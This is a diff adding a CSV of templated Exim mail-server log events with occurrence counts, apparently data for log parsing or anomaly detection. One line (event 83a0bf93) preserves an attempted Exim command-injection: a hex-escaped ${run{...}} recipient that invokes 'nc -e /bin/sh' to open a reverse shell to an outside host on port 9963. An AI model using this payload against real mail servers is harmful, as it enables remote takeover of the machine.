@@ -1,0 +1,14 @@
+EventId,EventTemplate,Occurrences
+fd3d2742,<*> <= <*> U=<*> P=<*> S=<*> <*>,1978
+b255e569,<*> => <*> <*> R=<*> T=<*>,2389
+4695c7f2,<*> Completed,1985
+86cf1be4,Start queue run: pid=<*>,298
+3c82302c,End queue run: pid=<*>,298
+f37316a2,<*> <= root@mail.cup.com U=<*> P=<*> S=<*>,6
+23e33b37,no host name found for IP address <*>,160
+64c9881a,VRFY failed for <*> H=(x) [<*>],158
+06785ab9,<*> <= <> <*> <*> P=<*> S=<*>,2
+83a0bf93,"1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t<*>\t9963\x22}}@localhost: Too many ""Received"" headers - suspected mail loop",1
+52dbcc9b,1j9ZoZ-0002Jk-9W Frozen (delivery error message),1
+d13f153c,1j9ZqV-0002Lc-DY => /<*> (root@mail.cup.com) <postmaster@mail.cup.com> R=<*> T=<*>,1
+b7f8f0ee,1j9ZoZ-0002Jk-9W Message is frozen,66
